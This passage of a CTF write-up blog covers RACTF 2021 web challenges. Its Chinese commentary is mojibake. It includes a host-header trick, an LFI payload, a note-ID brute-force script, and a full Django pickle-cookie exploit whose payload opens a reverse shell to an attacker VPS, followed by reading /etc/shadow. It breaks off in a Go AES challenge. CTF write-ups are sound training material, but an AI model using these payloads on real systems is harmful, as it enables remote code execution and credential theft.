&lt;p>è¿™é‡Œå¯ä»¥ç”¨&lt;a href="https://github.com/pielco11/fav-up">fav-up&lt;/a>ä¸€æŠŠæ¢­ï¼ˆä¹Ÿå°±æ˜¯è‡ªåŠ¨åŒ–äº†æå–å›¾æ ‡-&amp;gt;è®¡ç®—mmhashå€¼-&amp;gt;shodanæœç´¢å‡ºipè¿™ä¸ªè¿‡ç¨‹ï¼‰ï¼Œå¾—åˆ°ipä¸º&lt;code>178.62.4.214|178.62.15.164&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818021746841.png" alt="image-20210818021746841">&lt;/p>
&lt;p>&lt;code>ractf{DreadingPirates}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªéžé¢„æœŸè§£ï¼Œå½“ç”¨éžæ³•çš„host headerè¯·æ±‚æ—¶ï¼Œä¼šç›´æŽ¥è¿”å›žflag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s --socks5-hostname localhost:9050 -H &lt;span style="color:#d88200">&amp;#34;Host: asd.com&amp;#34;&lt;/span> ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.&lt;/em>&lt;/p>
&lt;h2 id="webemojibook">Web/Emojibook&lt;/h2>
&lt;blockquote>
&lt;p>&lt;img src="https://b.thumbs.redditmedia.com/4z_KB1qtCsTjcUqxDTbVIpJlR-AMzqrPeZDIz7VKdko.png" alt="img">&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>å¯ä»¥ç™»å½•ã€æ³¨å†Œè´¦æˆ·ã€å‘å¸ƒnoteã€æŸ¥çœ‹ï¼Œç»™å‡ºäº†æºç &lt;/p>
&lt;p>çœ‹æºç ï¼Œæ˜¯djangoæ¡†æž¶çš„åŽç«¯ï¼Œç›´å¥”settings.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815135148402.png" alt="image-20210815135148402">&lt;/p>
&lt;p>çœ‹åˆ°äº†ç†Ÿæ‚‰çš„pickle&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815145254055.png" alt="image-20210815145254055">&lt;/p>
&lt;p>åœ¨ä»…æœ‰çš„è¿™ä¸ªappçš„view.pyä¸­æœ‰è¿™æ ·çš„ä»£ç ï¼Œä¼šåœ¨noteçš„bodyéƒ¨åˆ†åŒ¹é…&lt;code>{{.*?}}&lt;/code>è¿™æ ·çš„å†…å®¹å¹¶å°†å…¶ä¸­çš„éƒ¨åˆ†æ‹¼æŽ¥åˆ°/emoji/åŽä»¥imageçš„å½¢å¼åŠ è½½å‡ºæ¥ï¼Œä½†æ˜¯ç›´æŽ¥ç”¨{{/flag.txt}}æ˜¯ä¸å¯ä»¥çš„ï¼Œè¿™éƒ¨åˆ†ä»£ç åœ¨forms.pyä¸­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818031453613.png" alt="image-20210818031453613">&lt;/p>
&lt;p>æ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯ &lt;code>{..{/flag.txt}..}&lt;/code>&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”ç„¶è€Œè¿™é‡Œæœ‰ä¸ªéžé¢„æœŸï¼Œurléƒ¨åˆ†å¯ä»¥ç›´æŽ¥ä¿®æ”¹noteç¼–å·è¾¾åˆ°æ°´å¹³è¶Šæƒï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡çˆ†ç ´æ–¹å¼æ‰¾åˆ°ä¹‹å‰å·²ç»æˆåŠŸçš„note&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">logging&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">thread_function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:30160/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;base64&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmFjdGZ7&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">threads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">thread_function&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">thread&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webemojybook-2">Web/Emojybook 2&lt;/h2>
&lt;blockquote>
&lt;p>no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>è·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ¨¡ä¸€æ ·ï¼Œç„¶è€Œè¿™æ¬¡å†ç”¨ä¹‹å‰çš„ &lt;code>{..{/flag.txt}..}&lt;/code>ä¼šè¿”å›ž500é”™è¯¯ï¼Œè¿™å›žå°±è¦ç”¨ä¸Šä¹‹å‰å®Œå…¨æ²¡ç”¨åˆ°çš„pickle session cookieäº†ã€‚&lt;/p>
&lt;p>å…ˆè¯»ä¸€ä¸‹/app/notebook/settings.pyï¼Œå¾—åˆ°secret_keyï¼Œç„¶åŽæžä¸€ä¸ªåå¼¹shellçš„cookieå‡ºæ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/&lt;/span>
&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">django.core.signing&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">django.contrib.sessions.serializers&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.http&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.conf&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">settings&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7&amp;#34;(S3xv,{sp)Xaqg?2pj2=hFCgN&amp;#34;CR&amp;#34;UPn4&amp;#39;&lt;/span>
&lt;span style="color:#111">settings&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">configure&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">DEFAULT_HASHING_ALGORITHM&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sha256&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Initial cookie when visiting the page&lt;/span>
&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM&amp;#34;&lt;/span>
&lt;span style="color:#111">newContent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PickleRce&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#d88200">&amp;#34;python -c &amp;#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">VPS IP&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">/bin/sh&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;testcookie&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PickleRce&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">new_cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">compress&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># We can then make a request with this cookie&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:23934/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sessionid&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">new_cookie&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾—åˆ°shellä¹‹åŽæˆ‘ä»¬åªæ˜¯ä¸ªwebç”¨æˆ·ï¼Œè¯»/etc/shadowå¯ä»¥iå¾—åˆ°adminçš„hashå€¼ï¼Œå¼±å£ä»¤ æ˜¯ä¸ª999999ï¼Œç„¶åŽæˆ‘ä»¬å°±å¯ä»¥&lt;code>su admin&lt;/code>ï¼Œè¯»flagäº†&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi_rce_not_unintended}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://techsupportjosh.com/posts/ractf-emojibook/">wp&lt;/a>&lt;/p>
&lt;h2 id="webmilitary-grade">Web/Military Grade&lt;/h2>
&lt;blockquote>
&lt;p>Go is safe, right? That means my implementation of AES will be secure?&lt;/p>
&lt;/blockquote>
&lt;p>ç»™å‡ºäº†goæ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;bytes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sync&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;time&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">rawFlag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;[REDACTED]&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">flagmu&lt;/span> &lt;span style="color:#75af00">sync&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Mutex&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">after&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">padding&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">padtext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">bytes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Repeat&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#75af00">padding&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">padtext&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bKey&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">bPlaintext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">PKCS5Padding&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">blockSize&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">plaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bKey&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCEncrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bIV&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bPlaintext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">EncodeToString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewTicker&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Millisecond&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">672&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">C&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">ticker&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Now&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">UnixNano&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">^&lt;/span>&lt;span style="color:#ae81ff">0x7FFFFFFFFEFFF000&lt;/span>&lt;span style="color:#111">)&lt;/span>
